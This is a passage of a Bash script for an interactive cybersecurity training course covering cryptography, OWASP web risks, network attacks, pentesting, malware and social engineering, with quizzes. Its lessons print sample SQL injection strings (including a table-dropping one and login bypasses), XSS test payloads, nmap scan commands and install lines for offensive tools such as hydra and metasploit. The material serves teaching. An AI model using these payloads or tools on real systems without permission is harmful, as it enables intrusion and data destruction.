    )
    
    for cmd_info in "${openssl_cmds[@]}"; do
        IFS='|' read -r command description <<< "$cmd_info"
        echo -e "${GREEN}$ $command${NC}"
        echo -e "  ${WHITE}→ $description${NC}"
        echo ""
    done
    
    # Create a simple encryption lab
    echo -e "${CYAN}Creating Encryption Lab Script...${NC}"
    
    cat > "$COURSE_DIR/labs/crypto_lab.sh" << 'SCRIPT'
#!/bin/bash
# Cryptography Lab Script

echo "========================================="
echo "    CRYPTOGRAPHY HANDS-ON LAB"
echo "========================================="
echo ""

# Base64 Demo
echo "=== BASE64 ENCODING ==="
echo -n "Enter text to encode: "
read -r text
encoded=$(echo "$text" | base64)
echo "Encoded: $encoded"
decoded=$(echo "$encoded" | base64 -d)
echo "Decoded: $decoded"
echo ""

# Hashing Demo
echo "=== HASHING ==="
echo -n "Enter text to hash: "
read -r hash_text
echo "MD5:    $(echo "$hash_text" | md5sum | cut -d' ' -f1)"
echo "SHA256: $(echo "$hash_text" | sha256sum | cut -d' ' -f1)"
echo ""

# Check if openssl is available
if command -v openssl &>/dev/null; then
    echo "=== PASSWORD HASHING (OpenSSL) ==="
    echo -n "Enter password to hash: "
    read -rs password
    echo ""
    echo "SHA256 Hash: $(echo "$password" | sha256sum | cut -d' ' -f1)"
    echo ""
fi

echo "Lab Complete!"
SCRIPT
    
    chmod +x "$COURSE_DIR/labs/crypto_lab.sh"
    echo -e "${GREEN}✅ Lab created: $COURSE_DIR/labs/crypto_lab.sh${NC}"
    
    press_enter
    
    # Module 4 Quiz
    clear_screen
    echo -e "${MAGENTA}🧠 MODULE 4 QUIZ${NC}"
    draw_line "=" 60
    
    ask_question \
        "Which encryption uses the same key for encrypt and decrypt?" \
        "symmetric" \
        "Sym- means same"
    
    ask_question \
        "Which hashing algorithm is recommended for passwords?" \
        "bcrypt" \
        "Not MD5, not SHA-1... adaptive algorithm"
    
    ask_question \
        "Can you reverse a hash function?" \
        "no" \
        "That's what makes hashing different from encryption"
    
    ask_question \
        "What is RSA an example of?" \
        "asymmetric encryption" \
        "Public/private key pair"
    
    show_quiz_result
    save_progress "MODULE_4"
    press_enter
}

# ============================================
# MODULE 5: WEB SECURITY
# ============================================

module_5_web() {
    clear_screen
    draw_box "MODULE 5: WEB APPLICATION SECURITY"
    
    echo -e "${CYAN}📚 LEARNING OBJECTIVES:${NC}"
    echo -e "  ${GREEN}►${NC} OWASP Top 10 vulnerabilities"
    echo -e "  ${GREEN}►${NC} SQL Injection understanding"
    echo -e "  ${GREEN}►${NC} Cross-Site Scripting (XSS)"
    echo -e "  ${GREEN}►${NC} Web security testing basics"
    press_enter
    
    # Lesson 5.1 - OWASP Top 10
    clear_screen
    echo -e "${YELLOW}📖 LESSON 5.1: OWASP Top 10 (2021)${NC}"
    draw_line "-" 60
    echo ""
    echo -e "${WHITE}OWASP = Open Web Application Security Project${NC}"
    echo ""
    
    owasp=(
        "A01|Broken Access Control|Most common: unauthorized access to resources"
        "A02|Cryptographic Failures|Weak encryption, plaintext data, weak protocols"
        "A03|Injection|SQL, NoSQL, OS, LDAP injection attacks"
        "A04|Insecure Design|Missing security controls in design phase"
        "A05|Security Misconfiguration|Default configs, unnecessary features enabled"
        "A06|Vulnerable Components|Outdated libraries, unpatched software"
        "A07|Authentication Failures|Weak passwords, session management issues"
        "A08|Software Data Integrity|CI/CD pipeline security, auto-updates"
        "A09|Logging Failures|No monitoring, no audit logs"
        "A10|SSRF|Server-Side Request Forgery attacks"
    )
    
    for item in "${owasp[@]}"; do
        IFS='|' read -r code name description <<< "$item"
        echo -e "${RED}$code${NC} - ${WHITE}$name${NC}"
        echo -e "     ${YELLOW}→ $description${NC}"
        echo ""
    done
    
    press_enter
    
    # Lesson 5.2 - SQL Injection
    clear_screen
    echo -e "${YELLOW}📖 LESSON 5.2: SQL Injection (Educational)${NC}"
    draw_line "-" 60
    echo ""
    echo -e "${RED}⚠️  FOR EDUCATIONAL PURPOSES ONLY ⚠️${NC}"
    echo -e "${RED}   Only test on systems you own or have permission${NC}"
    echo ""
    
    cat << 'LESSON'
SQL INJECTION EXPLAINED:
━━━━━━━━━━━━━━━━━━━━━━━━
When user input is not properly sanitized, attackers
can insert malicious SQL code.

VULNERABLE CODE EXAMPLE:
┌─────────────────────────────────────────────┐
│ query = "SELECT * FROM users WHERE         │
│   username = '" + username + "'"           │
│   AND password = '" + password + "'"       │
└─────────────────────────────────────────────┘

ATTACK INPUT:
  Username: admin' --
  Password: anything

RESULTING QUERY:
  SELECT * FROM users WHERE username = 'admin' --' 
  AND password = 'anything'
  
  (-- comments out the password check!)

COMMON SQL INJECTION PAYLOADS:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  ' OR '1'='1           - Always true condition
  ' OR 1=1 --           - Bypass authentication
  '; DROP TABLE users;-- - Destructive (Bobby Tables)
  ' UNION SELECT ...    - Extract other table data
  admin' --             - Login bypass

PREVENTION:
━━━━━━━━━━━━
  ✅ Use Parameterized Queries / Prepared Statements
  ✅ Input validation and sanitization
  ✅ Principle of least privilege for DB accounts
  ✅ Web Application Firewall (WAF)
  ✅ Error handling (don't expose DB errors)
  ✅ Regular security audits
LESSON
    
    press_enter
    
    # Lesson 5.3 - XSS
    clear_screen
    echo -e "${YELLOW}📖 LESSON 5.3: Cross-Site Scripting (XSS)${NC}"
    draw_line "-" 60
    echo ""
    
    cat << 'LESSON'
WHAT IS XSS?
━━━━━━━━━━━━
Injection of malicious scripts into web pages viewed
by other users. Exploits the browser's trust in the site.

TYPES OF XSS:
━━━━━━━━━━━━━
1. STORED XSS (Persistent)
   • Script saved in database
   • Every visitor is affected
   • Most dangerous type
   
2. REFLECTED XSS (Non-Persistent)
   • Script in URL/request parameter
   • Only affects clicking user
   • Often used in phishing
   
3. DOM-BASED XSS
   • Manipulates DOM on client side
   • No server interaction needed

EXAMPLE XSS PAYLOAD:
━━━━━━━━━━━━━━━━━━━━
  <script>alert('XSS')</script>
  <img src=x onerror=alert('XSS')>
  <svg onload=alert('XSS')>
  javascript:alert('XSS')

WHAT ATTACKERS CAN DO:
━━━━━━━━━━━━━━━━━━━━━━
  • Steal session cookies
  • Redirect to phishing sites
  • Keylogging
  • Defacing websites
  • Browser exploitation

PREVENTION:
━━━━━━━━━━━
  ✅ Output encoding/escaping
  ✅ Content Security Policy (CSP)
  ✅ HttpOnly cookies
  ✅ Input validation
  ✅ Use security libraries
  ✅ X-XSS-Protection header
LESSON
    
    press_enter
    
    # Lesson 5.4 - Web Reconnaissance
    clear_screen
    echo -e "${YELLOW}📖 LESSON 5.4: Web Reconnaissance (Passive)${NC}"
    draw_line "-" 60
    echo ""
    
    cat << 'LESSON'
PASSIVE RECONNAISSANCE:
━━━━━━━━━━━━━━━━━━━━━━━
Gathering information without directly interacting
with the target system.

TECHNIQUES:
━━━━━━━━━━━━
1. WHOIS Lookup
   → Domain registration info, owner, nameservers

2. DNS Enumeration
   → Subdomains, mail servers, IP addresses

3. Google Dorking
   → site:example.com
   → filetype:pdf site:example.com
   → inurl:admin site:example.com
   → intitle:"index of" site:example.com

4. Shodan.io
   → Search for internet-connected devices
   → Find exposed services and systems

5. OSINT Tools
   → theHarvester (emails, subdomains)
   → Maltego (link analysis)
   → Recon-ng (web reconnaissance)

6. Wayback Machine
   → View historical versions of websites
   → Find old pages, emails, usernames

7. Certificate Transparency
   → crt.sh for finding subdomains
   → SSL certificate history
LESSON
    
    echo -e "${GREEN}💻 DEMO - DNS Lookup:${NC}"
    echo -e "${YELLOW}nslookup google.com${NC}"
    nslookup google.com 2>/dev/null | head -10 || echo "nslookup not available, try: pkg install dnsutils"
    
    press_enter
    
    # Module 5 Quiz
    clear_screen
    echo -e "${MAGENTA}🧠 MODULE 5 QUIZ${NC}"
    draw_line "=" 60
    
    ask_question \
        "What is the #1 OWASP risk in 2021?" \
        "broken access control" \
        "Most common web vulnerability"
    
    ask_question \
        "What is the best defense against SQL injection?" \
        "parameterized queries" \
        "Also called prepared statements"
    
    ask_question \
        "Which XSS type is the most dangerous?" \
        "stored" \
        "Also called persistent XSS"
    
    ask_question \
        "What does OWASP stand for?" \
        "open web application security project" \
        "Web security organization/project"
    
    show_quiz_result
    save_progress "MODULE_5"
    press_enter
}

# ============================================
# MODULE 6: NETWORK ATTACKS & DEFENSE
# ============================================

module_6_network_attacks() {
    clear_screen
    draw_box "MODULE 6: NETWORK ATTACKS & DEFENSE"
    
    echo -e "${CYAN}📚 LEARNING OBJECTIVES:${NC}"
    echo -e "  ${GREEN}►${NC} Common network attacks"
    echo -e "  ${GREEN}►${NC} Wireless security"
    echo -e "  ${GREEN}►${NC} Firewalls and IDS/IPS"
    echo -e "  ${GREEN}►${NC} VPN and tunneling"
    press_enter
    
    # Lesson 6.1 - Network Attacks
    clear_screen
    echo -e "${YELLOW}📖 LESSON 6.1: Common Network Attacks${NC}"
    draw_line "-" 60
    echo ""
    
    attacks=(
        "ARP Poisoning|Sends fake ARP messages to link attacker's MAC with victim's IP. Enables MITM attacks."
        "DNS Spoofing|Corrupts DNS cache to redirect traffic to malicious sites."
        "Port Scanning|Probing ports to find open services and vulnerabilities."
        "Packet Sniffing|Capturing network packets to read unencrypted data."
        "Session Hijacking|Stealing session tokens to take over user sessions."
        "VLAN Hopping|Bypassing VLAN segmentation to access other networks."
        "BGP Hijacking|Manipulating routing tables to redirect internet traffic."
        "SSL Stripping|Downgrading HTTPS to HTTP to intercept traffic."
        "Rogue Access Point|Fake WiFi hotspot to capture user traffic."
        "Evil Twin|Duplicate of legitimate WiFi to trick users."
    )
    
    for attack in "${attacks[@]}"; do
        IFS='|' read -r name description <<< "$attack"
        echo -e "${RED}⚡ $name${NC}"
        echo -e "   ${WHITE}$description${NC}"
        echo ""
    done
    
    press_enter
    
    # Lesson 6.2 - Wireless Security
    clear_screen
    echo -e "${YELLOW}📖 LESSON 6.2: Wireless Network Security${NC}"
    draw_line "-" 60
    echo ""
    
    cat << 'LESSON'
WIFI SECURITY PROTOCOLS:
━━━━━━━━━━━━━━━━━━━━━━━━

WEP (Wired Equivalent Privacy)
  ❌ BROKEN - Never use
  ❌ RC4 cipher with weak key scheduling
  ❌ Can be cracked in minutes

WPA (WiFi Protected Access)
  ⚠️  WEAK - Vulnerable to TKIP attacks
  ⚠️  Temporary fix for WEP issues

WPA2
  ✅ Currently acceptable
  ✅ AES-CCMP encryption
  ⚠️  KRACK vulnerability (2017)
  ⚠️  WPS can be attacked

WPA3
  ✅ BEST - Use when possible
  ✅ SAE (Simultaneous Authentication of Equals)
  ✅ Forward secrecy
  ✅ 192-bit encryption option

WIFI SECURITY BEST PRACTICES:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  ✅ Use WPA3 or WPA2 (no WEP/WPA)
  ✅ Strong, unique password (20+ chars)
  ✅ Disable WPS
  ✅ Hide SSID (not strong but helps)
  ✅ Enable MAC filtering
  ✅ Use guest network for visitors
  ✅ Regular firmware updates
  ✅ Monitor connected devices
  ❌ Don't use public WiFi without VPN
  ❌ Don't use default router passwords
LESSON
    
    press_enter
    
    # Lesson 6.3 - Firewalls and IDS
    clear_screen
    echo -e "${YELLOW}📖 LESSON 6.3: Firewalls, IDS & IPS${NC}"
    draw_line "-" 60
    echo ""
    
    cat << 'LESSON'
FIREWALL TYPES:
━━━━━━━━━━━━━━━
1. PACKET FILTERING
   • Checks source/destination IP, port, protocol
   • Fast but limited inspection
   
2. STATEFUL INSPECTION
   • Tracks connection state
   • Better than packet filtering
   
3. APPLICATION LAYER (Layer 7)
   • Deep packet inspection
   • Understands application protocols
   
4. NEXT-GEN FIREWALL (NGFW)
   • All above + IPS, antivirus, URL filtering
   • Identity-based policies

IDS vs IPS:
━━━━━━━━━━━━
  IDS (Intrusion Detection System)
  → DETECTS and ALERTS on suspicious activity
  → Passive - doesn't block

  IPS (Intrusion Prevention System)
  → DETECTS and BLOCKS threats
  → Active - can stop attacks

DETECTION METHODS:
━━━━━━━━━━━━━━━━━━
  Signature-based: Matches known attack patterns
  Anomaly-based: Detects deviations from normal
  Heuristic-based: Behavior analysis

LINUX FIREWALL (iptables):
━━━━━━━━━━━━━━━━━━━━━━━━━
  Block incoming:  iptables -A INPUT -j DROP
  Allow SSH:       iptables -A INPUT -p tcp --dport 22 -j ACCEPT
  Allow HTTP:      iptables -A INPUT -p tcp --dport 80 -j ACCEPT
  List rules:      iptables -L -n -v
  Save rules:      iptables-save > /etc/iptables.rules
LESSON
    
    press_enter
    
    # Lesson 6.4 - VPN
    clear_screen
    echo -e "${YELLOW}📖 LESSON 6.4: VPN & Tunneling${NC}"
    draw_line "-" 60
    echo ""
    
    cat << 'LESSON'
WHAT IS A VPN?
━━━━━━━━━━━━━━
Virtual Private Network creates an encrypted tunnel
between your device and a VPN server.

HOW IT WORKS:
  [Your Device] → [Encrypted Tunnel] → [VPN Server] → [Internet]

WHAT VPN PROTECTS:
━━━━━━━━━━━━━━━━━━
  ✅ Hides your real IP address
  ✅ Encrypts traffic on public WiFi
  ✅ Bypasses geographical restrictions
  ✅ Protects from ISP monitoring
  ✅ Secure remote access to corporate networks

WHAT VPN DOESN'T PROTECT:
━━━━━━━━━━━━━━━━━━━━━━━━━
  ❌ Malware on your device
  ❌ Phishing attacks
  ❌ Tracking by logged-in accounts (Google, FB)
  ❌ Your behavior on VPN provider's network

VPN PROTOCOLS:
━━━━━━━━━━━━━━
  OpenVPN   - Open source, reliable (recommended)
  WireGuard - Modern, fast, secure
  IKEv2     - Good for mobile
  L2TP/IPsec - Decent security
  PPTP      - BROKEN - Never use!

TUNNELING:
━━━━━━━━━━
  SSH Tunneling: ssh -L localport:remote:port user@server
  → Forward local port through SSH to remote server
  
  Dynamic SOCKS: ssh -D 1080 user@server  
  → Use SSH as SOCKS proxy
LESSON
    
    echo -e "${GREEN}💻 SSH Tunnel Examples:${NC}"
    echo ""
    echo -e "${WHITE}Local Port Forward:${NC}"
    echo -e "${CYAN}ssh -L 8080:internal-server:80 user@jump-host${NC}"
    echo -e "Access internal-server port 80 via localhost:8080"
    echo ""
    echo -e "${WHITE}Dynamic SOCKS Proxy:${NC}"
    echo -e "${CYAN}ssh -D 9050 user@server${NC}"
    echo -e "Route browser traffic through SSH"
    
    press_enter
    
    # Module 6 Quiz
    clear_screen
    echo -e "${MAGENTA}🧠 MODULE 6 QUIZ${NC}"
    draw_line "=" 60
    
    ask_question \
        "Which WiFi security protocol should you NEVER use?" \
        "wep" \
        "The oldest and most broken one"
    
    ask_question \
        "What is the difference between IDS and IPS?" \
        "ids detects ips prevents" \
        "One monitors, one blocks"
    
    ask_question \
        "Which VPN protocol is modern and very fast?" \
        "wireguard" \
        "Released in 2019, now in Linux kernel"
    
    ask_question \
        "What type of attack creates a fake WiFi hotspot?" \
        "evil twin" \
        "Malicious twin of legitimate network"
    
    show_quiz_result
    save_progress "MODULE_6"
    press_enter
}

# ============================================
# MODULE 7: PENETRATION TESTING
# ============================================

module_7_pentest() {
    clear_screen
    draw_box "MODULE 7: PENETRATION TESTING BASICS"
    
    echo -e "${RED}⚠️  LEGAL DISCLAIMER ⚠️${NC}"
    echo -e "${WHITE}Only perform penetration testing on systems you${NC}"
    echo -e "${WHITE}own or have EXPLICIT written permission to test.${NC}"
    echo -e "${WHITE}Unauthorized testing is ILLEGAL and unethical.${NC}"
    echo ""
    press_enter
    
    # Lesson 7.1 - Pentest Phases
    clear_screen
    echo -e "${YELLOW}📖 LESSON 7.1: Penetration Testing Phases${NC}"
    draw_line "-" 60
    echo ""
    
    cat << 'LESSON'
PENETRATION TESTING METHODOLOGY:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

PHASE 1: PLANNING & RECONNAISSANCE
  • Define scope and rules of engagement
  • Gather OSINT (passive information)
  • Identify target systems
  
PHASE 2: SCANNING
  • Network discovery
  • Port scanning
  • Service enumeration
  • Vulnerability scanning

PHASE 3: GAINING ACCESS (EXPLOITATION)
  • Exploit vulnerabilities found
  • Password attacks
  • Social engineering
  • Exploit frameworks

PHASE 4: MAINTAINING ACCESS
  • Install backdoors (for testing only!)
  • Privilege escalation
  • Lateral movement

PHASE 5: REPORTING
  • Document all findings
  • Risk ratings
  • Remediation recommendations
  • Executive summary

TYPES OF PENETRATION TESTS:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  Black Box: No prior knowledge of target
  White Box: Full knowledge (source code, docs)
  Grey Box: Partial knowledge (user credentials)

LEGAL REQUIREMENTS:
━━━━━━━━━━━━━━━━━━━
  ✅ Written authorization (signed contract)
  ✅ Defined scope (what's in/out)
  ✅ NDA agreements
  ✅ Rules of engagement
  ✅ Emergency contacts
LESSON
    
    press_enter
    
    # Lesson 7.2 - Termux Security Tools
    clear_screen
    echo -e "${YELLOW}📖 LESSON 7.2: Security Tools Available in Termux${NC}"
    draw_line "-" 60
    echo ""
    
    echo -e "${CYAN}INSTALLING SECURITY TOOLS IN TERMUX:${NC}"
    echo ""
    
    tools=(
        "nmap|Port scanner|pkg install nmap"
        "metasploit|Exploitation framework|pkg install unstable-repo && pkg install metasploit"
        "hydra|Password cracker|pkg install hydra"
        "sqlmap|SQL injection tool|pkg install python && pip install sqlmap"
        "netcat|Network utility|pkg install netcat-openbsd"
        "wireshark|Packet analyzer|pkg install termux-api"
        "john|Password cracker|pkg install john-the-ripper"
        "hashcat|GPU hash cracker|pkg install hashcat"
        "aircrack-ng|WiFi security|pkg install aircrack-ng"
        "curl|HTTP client|pkg install curl"
        "git|Version control|pkg install git"
        "python|Scripting|pkg install python"
        "ruby|Scripting|pkg install ruby"
    )
    
    echo -e "${CYAN}┌────────────────┬────────────────────────┬──────────────────────────────┐${NC}"
    echo -e "${CYAN}│ Tool           │ Purpose                │ Install Command              │${NC}"
    echo -e "${CYAN}├────────────────┼────────────────────────┼──────────────────────────────┤${NC}"
    
    for tool_info in "${tools[@]}"; do
        IFS='|' read -r tool purpose install <<< "$tool_info"
        printf "${CYAN}│${NC} %-14s ${CYAN}│${NC} %-22s ${CYAN}│${NC} %-28s ${CYAN}│${NC}\n" \
            "$tool" "$purpose" "$install"
    done
    
    echo -e "${CYAN}└────────────────┴────────────────────────┴──────────────────────────────┘${NC}"
    
    press_enter
    
    # Lesson 7.3 - Nmap Basics
    clear_screen
    echo -e "${YELLOW}📖 LESSON 7.3: Nmap - The Network Scanner${NC}"
    draw_line "-" 60
    echo ""
    echo -e "${RED}⚠️  Only scan networks you own or have permission to scan!${NC}"
    echo ""
    
    cat << 'LESSON'
NMAP SCAN TYPES:
━━━━━━━━━━━━━━━━
  -sS  SYN Scan (Stealth) - Most common
  -sT  TCP Connect Scan   - Full connection
  -sU  UDP Scan           - UDP ports
  -sA  ACK Scan           - Firewall detection
  -sV  Version Detection  - Service versions
  -sC  Default Scripts    - Run NSE scripts
  -O   OS Detection       - Guess operating system
  -A   Aggressive         - OS, version, scripts, traceroute

PORT SPECIFICATIONS:
━━━━━━━━━━━━━━━━━━━━
  -p 80          Specific port
  -p 1-1000      Port range
  -p 80,443,22   Multiple ports
  -p-            All 65535 ports
  --top-ports 100  Most common 100 ports

OUTPUT OPTIONS:
━━━━━━━━━━━━━━━
  -oN file.txt   Normal output
  -oX file.xml   XML output
  -oG file.gnmap Grepable output
  -oA basename   All formats

TIMING OPTIONS (1-5, higher=faster):
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  -T0  Paranoid (very slow, evasive)
  -T3  Normal (default)
  -T4  Aggressive (faster)
  -T5  Insane (very fast, noisy)

COMMON NMAP COMMANDS:
━━━━━━━━━━━━━━━━━━━━━
  nmap 192.168.1.1           Basic scan
  nmap 192.168.1.0/24        Scan entire subnet
  nmap -sV -sC target        Version + scripts
  nmap -A -T4 target         Aggressive scan
  nmap -p- target            All ports scan
  nmap -sV --script vuln target  Vulnerability scan
LESSON
    
    echo -e "${GREEN}💻 DEMO - Scanning localhost:${NC}"
    echo -e "${YELLOW}nmap localhost${NC}"
    nmap localhost 2>/dev/null | head -20 || echo -e "${RED}nmap not installed. Install: pkg install nmap${NC}"
    
    press_enter
    
    # Lesson 7.4 - Password Attacks
    clear_screen
    echo -e "${YELLOW}📖 LESSON 7.4: Password Attack Techniques${NC}"
    draw_line "-" 60
    echo ""
    echo -e "${RED}⚠️  EDUCATIONAL ONLY - Never use against systems without permission!${NC}"
    echo ""
    
    cat << 'LESSON'
PASSWORD ATTACK TYPES:
━━━━━━━━━━━━━━━━━━━━━━

1. BRUTE FORCE
   • Try all possible combinations
   • Slow but guaranteed to work eventually
   • 8-char password: 200 billion+ combinations!

2. DICTIONARY ATTACK
   • Use wordlist of common passwords
   • Much faster than pure brute force
   • Popular wordlists: rockyou.txt, SecLists

3. HYBRID ATTACK
   • Dictionary + rules (l33tspeak, numbers)
   • Password1, P@ssw0rd, qwerty123

4. CREDENTIAL STUFFING
   • Use leaked username/password combos
   • Effective due to password reuse

5. PASSWORD SPRAYING
   • Few passwords tried against many accounts
   • Avoids account lockout detection

6. RAINBOW TABLE
   • Pre-computed hash table
   • Fast lookup for unsalted hashes
   • Salting prevents this!

TOOLS:
━━━━━━
  Hydra:    Network service brute forcing
  John:     Password hash cracking
  Hashcat:  GPU-accelerated hash cracking
  Medusa:   Parallel password cracker
  Burp:     Web application brute force

DEFENSE:
━━━━━━━━
  ✅ Long passwords (20+ chars)
  ✅ Multi-Factor Authentication (MFA)
  ✅ Account lockout policies
  ✅ Password managers
  ✅ Breach monitoring (haveibeenpwned.com)
  ✅ Salted password hashing (bcrypt, Argon2)
LESSON
    
    press_enter
    
    # Module 7 Quiz
    clear_screen
    echo -e "${MAGENTA}🧠 MODULE 7 QUIZ${NC}"
    draw_line "=" 60
    
    ask_question \
        "What is the first phase of penetration testing?" \
        "planning" \
        "Also called reconnaissance planning"
    
    ask_question \
        "What nmap flag is used for version detection?" \
        "-sV" \
        "s for scan, V for version"
    
    ask_question \
        "What attack uses leaked username/password pairs?" \
        "credential stuffing" \
        "Reusing credentials from data breaches"
    
    ask_question \
        "What is the best defense against rainbow table attacks?" \
        "salting" \
        "Adding random data to passwords before hashing"
    
    show_quiz_result
    save_progress "MODULE_7"
    press_enter
}

# ============================================
# MODULE 8: MALWARE ANALYSIS
# ============================================

module_8_malware() {
    clear_screen
    draw_box "MODULE 8: MALWARE ANALYSIS & DEFENSE"
    
    echo -e "${CYAN}📚 LEARNING OBJECTIVES:${NC}"
    echo -e "  ${GREEN}►${NC} Types of malware"
    echo -e "  ${GREEN}►${NC} How malware works"
    echo -e "  ${GREEN}►${NC} Static and dynamic analysis"
    echo -e "  ${GREEN}►${NC} Malware defense strategies"
    press_enter
    
    # Lesson 8.1 - Malware Types
    clear_screen
    echo -e "${YELLOW}📖 LESSON 8.1: Types of Malware${NC}"
    draw_line "-" 60
    echo ""
    
    malware_types=(
        "🦠 VIRUS|Attaches to legitimate files, spreads when file is executed|Boot sectors, document macros"
        "🐛 WORM|Self-replicating, spreads through networks without user action|WannaCry, ILOVEYOU, Nimda"
        "🐴 TROJAN|Disguised as legitimate software|RATs, banking trojans, downloaders"
        "💰 RANSOMWARE|Encrypts files, demands payment for decryption|CryptoLocker, WannaCry, REvil"
        "🕵️ SPYWARE|Secretly monitors user activity|Keyloggers, screen capturers"
        "📣 ADWARE|Displays unwanted advertisements|Browser hijackers, pop-ups"
        "🤖 BOTNET|Network of infected computers (bots)|DDoS, spam, mining"
        "🔑 KEYLOGGER|Records keystrokes to steal passwords|Hardware/software keyloggers"
        "🪟 ROOTKIT|Hides malware, grants root access|Firmware rootkits, kernel rootkits"
        "💎 CRYPTOMINER|Uses resources to mine cryptocurrency|Browser miners, file miners"
        "📂 FILELESS|Lives in memory, no files on disk|PowerShell attacks, script-based"
        "🎭 POLYMORPHIC|Changes code to avoid detection|Metamorphic viruses"
    )
    
    for malware in "${malware_types[@]}"; do
        IFS='|' read -r name description examples <<< "$malware"
        echo -e "${RED}$name${NC}"
        echo -e "   ${WHITE}$description${NC}"
        echo -e "   ${YELLOW}Examples: $examples${NC}"
        echo ""
    done
    
    press_enter
    
    # Lesson 8.2 - Malware Analysis
    clear_screen
    echo -e "${YELLOW}📖 LESSON 8.2: Malware Analysis Methods${NC}"
    draw_line "-" 60
    echo ""
    
    cat << 'LESSON'
STATIC ANALYSIS:
━━━━━━━━━━━━━━━━
Analyzing malware WITHOUT executing it.

  Tools & Techniques:
  • File identification (file, strings command)
  • PE header analysis
  • Import/export table examination
  • Disassembly (IDA Pro, Ghidra, radare2)
  • String extraction
  • Signature matching (VirusTotal)
  • Yara rules

Commands in Termux:
  strings malware_file | grep -i http
  strings malware_file | grep -i password
  file unknown_file
  xxd binary_file | head

DYNAMIC ANALYSIS:
━━━━━━━━━━━━━━━━━
Executing malware in a controlled environment.

  Environment:
  • Isolated sandbox (Cuckoo Sandbox)
  • Virtual machine (snapshots!)
  • Network monitoring (Wireshark)
  • System call monitoring (strace)
  • Registry monitoring (Windows)

  What to Monitor:
  • File system changes
  • Network connections
  • Registry modifications
  • Process creation
  • Memory allocations

ONLINE SANDBOX TOOLS:
━━━━━━━━━━━━━━━━━━━━━
  • VirusTotal.com (file scanning)
  • Any.run (interactive sandbox)
  • Hybrid-analysis.com
  • Joe Sandbox
  • Cuckoo Sandbox (self-hosted)

INDICATORS OF COMPROMISE (IOC):
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  • File hashes (MD5, SHA256)
  • IP addresses and domains
  • URLs and URIs
  • Registry keys
  • Mutex names
  • User-agent strings
LESSON
    
    press_enter
    
    # Lesson 8.3 - Malware Defense
    clear_screen
    echo -e "${YELLOW}📖 LESSON 8.3: Malware Defense Strategies${NC}"
    draw_line "-" 60
    echo ""
    
    cat << 'LESSON'
PREVENTION STRATEGIES:
━━━━━━━━━━━━━━━━━━━━━━

1. ENDPOINT PROTECTION
   ✅ Antivirus/EDR solutions
   ✅ Application whitelisting
   ✅ Behavioral monitoring
   ✅ Regular signature updates

2. EMAIL SECURITY
   ✅ Anti-spam filtering
   ✅ Email sandboxing
   ✅ Don't open unknown attachments
   ✅ Verify sender before clicking links

3. WEB SECURITY
   ✅ Web filtering/proxy
   ✅ Keep browsers updated
   ✅ Use ad-blockers
   ✅ Disable JavaScript where possible

4. PATCH MANAGEMENT
   ✅ Regular OS updates
   ✅ Application patching
   ✅ Firmware updates
   ✅ Third-party software updates

5. BACKUP STRATEGY
   ✅ 3-2-1 Rule:
      3 copies of data
      2 different media types
      1 offsite backup
   ✅ Test restores regularly
   ✅ Immutable backups (ransomware)

6. USER EDUCATION
   ✅ Security awareness training
   ✅ Phishing simulation
   ✅ Report suspicious activity
   ✅ Password security

7. NETWORK SEGMENTATION
   ✅ Isolate critical systems
   ✅ VLANs for separation
   ✅ Zero Trust Architecture
   ✅ Micro-segmentation

INCIDENT RESPONSE:
━━━━━━━━━━━━━━━━━━
  1. Prepare (before incident)
  2. Identify (detect the incident)
  3. Contain (stop the spread)
  4. Eradicate (remove malware)
  5. Recover (restore systems)
  6. Lessons Learned (improve)
LESSON
    
    press_enter
    
    # Module 8 Quiz
    clear_screen
    echo -e "${MAGENTA}🧠 MODULE 8 QUIZ${NC}"
    draw_line "=" 60
    
    ask_question \
        "Which malware encrypts your files and demands payment?" \
        "ransomware" \
        "Think: ransom + ware"
    
    ask_question \
        "What is analyzing malware without running it called?" \
        "static analysis" \
        "Opposite of dynamic analysis"
    
    ask_question \
        "What does the 3-2-1 backup rule mean?" \
        "3 copies 2 media 1 offsite" \
        "Three numbers representing copies, formats, location"
    
    ask_question \
        "Which malware hides itself and provides root access?" \
        "rootkit" \
        "Root + kit = ?"
    
    show_quiz_result
    save_progress "MODULE_8"
    press_enter
}

# ============================================
# MODULE 9: SOCIAL ENGINEERING
# ============================================

module_9_social() {
    clear_screen
    draw_box "MODULE 9: SOCIAL ENGINEERING"
    
    echo -e "${CYAN}📚 LEARNING OBJECTIVES:${NC}"
    echo -e "  ${GREEN}►${NC} Social engineering techniques"
    echo -e "  ${GREEN}►${NC} Phishing attacks"
    echo -e "  ${GREEN}►${NC} Psychological manipulation"
    echo -e "  ${GREEN}►${NC} Defense against social engineering"
    press_enter
    
    # Lesson 9.1 - Social Engineering Basics
    clear_screen
    echo -e "${YELLOW}📖 LESSON 9.1: What is Social Engineering?${NC}"
    draw_line "-" 60
    echo ""
    
    cat << 'LESSON'
"The art of manipulating people so they give up
 confidential information." - Kevin Mitnick

Social engineering exploits human psychology rather
than technical vulnerabilities.

WHY IT WORKS:
━━━━━━━━━━━━━
  • Humans are the weakest link in security
  • We tend to trust and help others
  • Authority figures are obeyed
  • Fear and urgency cloud judgment
  • Curiosity drives clicks
  • Social proof (everyone is doing it)

PSYCHOLOGICAL PRINCIPLES USED:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  1. AUTHORITY    - Pretend to be boss/IT/police
  2. URGENCY      - "Act now or your account is closed!"
  3. SCARCITY     - "Limited time offer!"
  4. SOCIAL PROOF - "Everyone on your team already did this"
  5. LIKING       - Build rapport before asking
  6. RECIPROCITY  - Give something first, then ask
  7. FEAR         - "Your computer is infected!"

FAMOUS SOCIAL ENGINEERING ATTACKS:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  • Kevin Mitnick - Talked his way into systems
  • Twitter 2020 Hack - Phone phishing of employees
  • RSA SecurID Breach - Spear phishing email
  • Target Breach - Phished an HVAC vendor
LESSON
    
    press_enter
    
    # Lesson 9.2 - Attack Types
    clear_screen
    echo -e "${YELLOW}📖 LESSON 9.2: Social Engineering Attack Types${NC}"
    draw_line "-" 60
    echo ""
    
    se_attacks=(
        "🎣 PHISHING|Mass emails pretending to be trusted organizations to steal credentials"
        "🎯 SPEAR PHISHING|Targeted phishing against specific individuals with personal details"
